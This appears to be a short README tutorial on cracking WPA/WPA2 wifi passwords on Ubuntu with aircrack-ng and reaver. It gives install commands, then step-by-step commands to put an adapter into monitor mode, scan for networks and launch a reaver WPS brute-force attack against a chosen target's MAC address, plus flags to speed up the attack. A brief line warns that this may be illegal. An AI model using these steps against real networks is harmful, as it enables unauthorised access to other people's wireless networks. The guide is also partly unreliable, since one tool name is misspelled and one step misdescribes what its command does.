# How to crack wpa/wpa2 passwords with linux (tested on ubuntu and Elementary OS)

In order to crack wifi passwords with linux you need to install aircrack-ng and reaver

How to isntall aircrack-ng: www.aircrack-ng.org/install.html

Form where to download reaver: https://code.google.com/p/reaver-wps/downloads/list

You might also need to install on you computer libpcap-dev and libsqlite3-dev, in order to do that just type the following lines in the terminal:
```
sudo apt-get install libpcap-dev
```
and
```
sudo apt-get install libsqlite3-dev
```

## Now, the next few line of codes you need to open the terminal

1. Firstly, discconect yourself from any wifi networks and type this code:
```
airmon-ng start wlan0
```

2. Next you need to put your wifi adapter into monitor mode, which will list all available wifi signals around you.
```
airdump-ng mon0
```
Once airdump list all availble wifi signals around, you can move to the next step, the actual attack.

3.After you decide which is you mark, all you need to do is to write this command with the marks mac adress in order to start the attack
```
reaver -i mon0 -b 00:11:22:33:44:55 -vv
```

## Cracking wifi passwords can be against the law in your country. You should not do this at all!

##TRICKS:

1. Speading the attack
```
reaver -i mon0 -b 00:01:02:03:04:05 -vv -d 0
```
                        OR
```
reaver -i mon0 -b 00:01:02:03:04:05 -vv --dh-small
```
